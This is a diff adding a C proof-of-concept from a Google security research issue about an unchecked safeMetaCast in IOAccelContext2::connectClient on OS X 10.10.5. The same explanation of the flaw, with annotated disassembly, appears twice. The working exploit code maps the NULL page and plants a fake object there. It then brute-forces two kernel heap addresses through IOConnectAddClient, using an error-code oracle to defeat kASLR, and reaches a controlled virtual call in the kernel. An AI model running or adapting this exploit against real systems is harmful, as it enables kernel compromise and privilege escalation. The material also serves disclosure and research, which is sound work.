@@ -1,0 +1,312 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=512
+
+IOUserClient::connectClient is an obscure IOKit method which according to the docs is supposed to "Inform a connection of a second connection."
+
+In fact IOKit provides no default implementation and only a handful of userclients actually implement it, and it's pretty much up to them
+to define the semantics of what "informing the connection of a second connection" actually means.
+
+One of the userclients which implements connectClient is IOAccelContext2 which is the parent of the IGAccelContext userclient family
+(which are the intel GPU accelerator userclients.)
+
+IOUserClient::connectClient is exposed to userspace as IOConnectAddClient.
+
+Here's the relevant kernel code from IOAcceleratorFamily2:
+
+__text:00000000000057E6 ; __int64 __fastcall IOAccelContext2::connectClient(IOAccelContext2 *__hidden this, IOUserClient *)
+__text:00000000000057E6                 public __ZN15IOAccelContext213connectClientEP12IOUserClient
+__text:00000000000057E6 __ZN15IOAccelContext213connectClientEP12IOUserClient proc near
+__text:00000000000057E6                                         ; DATA XREF: __const:000000000003BEE8o
+__text:00000000000057E6                                         ; __const:000000000003D2D80o ...
+__text:00000000000057E6                 push    rbp
+__text:00000000000057E7                 mov     rbp, rsp
+__text:00000000000057EA                 push    r15
+__text:00000000000057EC                 push    r14
+__text:00000000000057EE                 push    r12
+__text:00000000000057F0                 push    rbx
+__text:00000000000057F1                 mov     rbx, rdi
+__text:00000000000057F4                 mov     r14d, 0E00002C2h
+__text:00000000000057FA                 cmp     qword ptr [rbx+510h], 0
+__text:0000000000005802                 jnz     loc_590F
+__text:0000000000005808                 lea     rax, __ZN24IOAccelSharedUserClient29metaClassE ; IOAccelSharedUserClient2::metaClass
+__text:000000000000580F                 mov     rax, [rax]
+__text:0000000000005812                 mov     rdi, rsi             ; <-- (a)
+__text:0000000000005815                 mov     rsi, rax
+__text:0000000000005818                 call    __ZN15OSMetaClassBase12safeMetaCastEPKS_PK11OSMetaClass ; OSMetaClassBase::safeMetaCast(OSMetaClassBase const*,OSMetaClass const*)
+__text:000000000000581D                 mov     r15, rax             ; <-- (b)
+__text:0000000000005820                 mov     r12, [rbx+518h]
+__text:0000000000005827                 cmp     r12, [r15+0F8h]      ; <-- (c)
+__text:000000000000582E                 jnz     loc_590F
+__text:0000000000005834                 mov     rax, [r15+0E0h]
+__text:000000000000583B                 mov     r14d, 0E00002BCh     
+__text:0000000000005841                 cmp     rax, [rbx+4E8h]      ; <-- (d)
+__text:0000000000005848                 jnz     loc_590F
+...
+__text:0000000000005879                 mov     rdi, [r15+100h]      
+__text:0000000000005880                 mov     [rbx+510h], rdi
+__text:0000000000005887                 mov     rax, [rdi]
+__text:000000000000588A                 call    qword ptr [rax+20h]  ; <-- (e)
+
+At (a) we completely control the type of userclient which rsi points to (by passing a userclient io_connect_t to IOConnectAddClient.)
+safeMetaCast will either return the MetaClassBase of the cast if it's valid, or NULL if it isn't. A valid cast would be an object
+which inherits from IOAccelSharedUserClient2. If we pass an object which doesn't inherit from that then this will return NULL.
+
+The "safeMetaCast" is only "safe" if the return value is checked but as you can see at (b) and (c) the return value of safeMetaCast
+is used without any checking.
+
+At (c) the qword value at 0xf8 offset from NULL is compared with this+0x518. That value is a pointer to an IntelAccelerator object on the heap.
+In order to get past this check towards the more interesting code later on we need to be able to guess this pointer. Fortunately, nothing
+untoward will happen if we guess incorrectly, and in practice we only need to try around 65k guess, even with kASLR :) Even so, there's *another*
+check we have to pass at (d) also comparing against a heap pointer. Again we can guess this, but having to make two guesses each time
+leads to an exponential slowdown... Except, notice that just before making the cmp at (d) r14d was set to 0xE00002BC; this is actually
+the IOKit error code and gets returned to userspace! This means that we can actually make our brute-force attempts independent by checking the return
+value to determine if we made it past the first check, and only then start guessing the second pointer.
+
+In reality you can guess both the pointers in a few seconds.
+
+After passing the cmp at (d) the code goes on to read a vtable pointer at NULL and call a virtual function at an address we can control :)
+
+Tested on OS X 10.10.5 (14F27)
+*/
+
+// ianbeer
+
+// build:clang -o client_connect client_connect.c -m32 -framework IOKit -g -pagezero_size 0x0
+
+/*
+Failure to check return value of OSMetaClassBase::safeMetaCast in IOAccelContext2::connectClient leads to
+kernel address space layout leak and exploitable NULL dereference
+
+IOUserClient::connectClient is an obscure IOKit method which according to the docs is supposed to "Inform a connection of a second connection."
+
+In fact IOKit provides no default implementation and only a handful of userclients actually implement it, and it's pretty much up to them
+to define the semantics of what "informing the connection of a second connection" actually means.
+
+One of the userclients which implements connectClient is IOAccelContext2 which is the parent of the IGAccelContext userclient family
+(which are the intel GPU accelerator userclients.)
+
+IOUserClient::connectClient is exposed to userspace as IOConnectAddClient.
+
+Here's the relevant kernel code from IOAcceleratorFamily2:
+
+__text:00000000000057E6 ; __int64 __fastcall IOAccelContext2::connectClient(IOAccelContext2 *__hidden this, IOUserClient *)
+__text:00000000000057E6                 public __ZN15IOAccelContext213connectClientEP12IOUserClient
+__text:00000000000057E6 __ZN15IOAccelContext213connectClientEP12IOUserClient proc near
+__text:00000000000057E6                                         ; DATA XREF: __const:000000000003BEE8o
+__text:00000000000057E6                                         ; __const:000000000003D2D80o ...
+__text:00000000000057E6                 push    rbp
+__text:00000000000057E7                 mov     rbp, rsp
+__text:00000000000057EA                 push    r15
+__text:00000000000057EC                 push    r14
+__text:00000000000057EE                 push    r12
+__text:00000000000057F0                 push    rbx
+__text:00000000000057F1                 mov     rbx, rdi
+__text:00000000000057F4                 mov     r14d, 0E00002C2h
+__text:00000000000057FA                 cmp     qword ptr [rbx+510h], 0
+__text:0000000000005802                 jnz     loc_590F
+__text:0000000000005808                 lea     rax, __ZN24IOAccelSharedUserClient29metaClassE ; IOAccelSharedUserClient2::metaClass
+__text:000000000000580F                 mov     rax, [rax]
+__text:0000000000005812                 mov     rdi, rsi             ; <-- (a)
+__text:0000000000005815                 mov     rsi, rax
+__text:0000000000005818                 call    __ZN15OSMetaClassBase12safeMetaCastEPKS_PK11OSMetaClass ; OSMetaClassBase::safeMetaCast(OSMetaClassBase const*,OSMetaClass const*)
+__text:000000000000581D                 mov     r15, rax             ; <-- (b)
+__text:0000000000005820                 mov     r12, [rbx+518h]
+__text:0000000000005827                 cmp     r12, [r15+0F8h]      ; <-- (c)
+__text:000000000000582E                 jnz     loc_590F
+__text:0000000000005834                 mov     rax, [r15+0E0h]
+__text:000000000000583B                 mov     r14d, 0E00002BCh     
+__text:0000000000005841                 cmp     rax, [rbx+4E8h]      ; <-- (d)
+__text:0000000000005848                 jnz     loc_590F
+...
+__text:0000000000005879                 mov     rdi, [r15+100h]      
+__text:0000000000005880                 mov     [rbx+510h], rdi
+__text:0000000000005887                 mov     rax, [rdi]
+__text:000000000000588A                 call    qword ptr [rax+20h]  ; <-- (e)
+
+At (a) we completely control the type of userclient which rsi points to (by passing a userclient io_connect_t to IOConnectAddClient)
+safeMetaCast will either return the MetaClassBase of the cast if it's valid, or NULL if it isn't. A valid cast would be an object
+which inherits from IOAccelSharedUserClient2. If we pass an object which doesn't inherit from that then this will return NULL.
+
+The "safeMetaCast" is only "safe" if the return value is checked but as you can see at (b) and (c) the return value of safeMetaCast
+is used without any checking.
+
+At (c) the qword value at 0xf8 offset from NULL is compared with this+0x518. That value is a pointer to an IntelAccelerator object on the heap.
+In order to get past this check towards the more interesting code later on we need to be able to guess this pointer. Fortunately, nothing
+untoward will happen if we guess incorrectly, and in practise we only need to try around 65k guess, even with kASLR :) Even so, there's *another*
+check we have to pass at (d) also comparing against a heap pointer. Again we can guess this, but having to make two guesses each time
+leads to an exponential slowdown... Except, notice that just before making the cmp at (d) r14d was set to 0xE00002BC; this is actually
+the IOKit error code and gets returned to userspace! This means that we can actually make our brute-force attempts independent by checking the return
+value to determine if we made it past the first check, and only then start guessing the second pointer.
+
+In reality you can guess both the pointers in a few seconds.
+
+After passing the cmp at (d) the code goes on to read a vtable pointer at NULL and call a virtual function at an address we can control :)
+
+Tested on OS X 10.10.5 (14F27)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+io_connect_t get_accel_connection() {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
+  if(!matching){
+    printf("unable to create service matching dictionary\n");
+    return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+    printf("no matches\n");
+    return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+  printf("got service: %x\n", service);
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 1, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }else{
+    printf("got userclient connection: %x, type:%d\n", conn, 0);
+  }
+  
+  printf("got userclient connection: %x\n", conn);
+  return conn;
+}
+
+io_connect_t get_some_client() {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching("AppleRTC");
+  if(!matching){
+    printf("unable to create service matching dictionary\n");
+    return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+    printf("no matches\n");
+    return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+  printf("got service: %x\n", service);
+  
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }else{
+    printf("got userclient connection: %x, type:%d\n", conn, 0);
+  }
+  
+  printf("got userclient connection: %x\n", conn);
+  return conn;
+}
+
+kern_return_t guess_first(uint64_t guess, io_connect_t a, io_connect_t b) {
+  uint64_t* fake_obj = 0;
+  fake_obj[0xf8/8] = guess;
+
+  return IOConnectAddClient(a, b);
+}
+
+// need to make something like 65k guesses in the worst cast to find the IntelAccelerator object
+// (it's page aligned and we search a 512MB region)
+uint64_t find_intel_accelerator_addr(io_connect_t a, io_connect_t b) {
+  uint64_t guess = 0xffffff8010000000;
+  while (guess < 0xffffff8030000000) {
+    printf("trying 0x%llx\n", guess);
+    if (guess_first(guess, a, b) == 0xe00002bc) {
+      printf("got it: 0x%llx\n", guess);
+      return guess;
+    }
+    guess += 0x1000;
+  }
+  printf("no luck\n");
+  return 0;
+}
+
+kern_return_t guess_second(uint64_t guess, uint64_t accel_addr, io_connect_t a, io_connect_t b) {
+  uint64_t* fake_obj = 0;
+  fake_obj[0xf8/8] = accel_addr;
+
+  fake_obj[0xe0/8] = guess;
+
+  return IOConnectAddClient(a, b);
+}
+
+uint64_t find_second_addr(uint64_t accel_addr, io_connect_t a, io_connect_t b) {
+  uint64_t guess = accel_addr - 0x1000000; // reasonable place to start guessing
+  while (guess < 0xffffff8030000000) {
+    printf("trying 0x%llx\n", guess);
+    if (guess_second(guess, accel_addr, a, b) != 0xe00002bc) {
+      // not reached: we will call retain on the object at NULL now
+      // and will kernel panic reading the function pointer from the vtable at 414141...
+      printf("got it: 0x%llx\n", guess);
+      return guess;
+    }
+    guess += 0x10;
+  }
+  printf("no luck\n");
+  return 0;
+}
+
+int main(){
+  kern_return_t err;
+
+  // re map the null page rw
+  int var = 0;
+  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
+  if (err != KERN_SUCCESS){
+    printf("%x\n", err);
+  }
+  vm_address_t addr = 0;
+  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
+  if (err != KERN_SUCCESS){
+    if (err == KERN_INVALID_ADDRESS){
+      printf("invalid address\n");
+    }
+    if (err == KERN_NO_SPACE){
+      printf("no space\n");
+    }
+    printf("%x\n", err);
+  }
+  char* np = 0;
+  for (int i = 0; i < 0x1000; i++){
+    np[i] = 'A';
+  }
+
+  io_connect_t accel_connect = get_accel_connection();
+
+  // create an unrelated client 
+  io_connect_t a_client = get_some_client();
+
+  uint64_t first_addr = find_intel_accelerator_addr(accel_connect, a_client);
+  uint64_t second_addr = find_second_addr(first_addr, accel_connect, a_client);
+  return 0;
+}
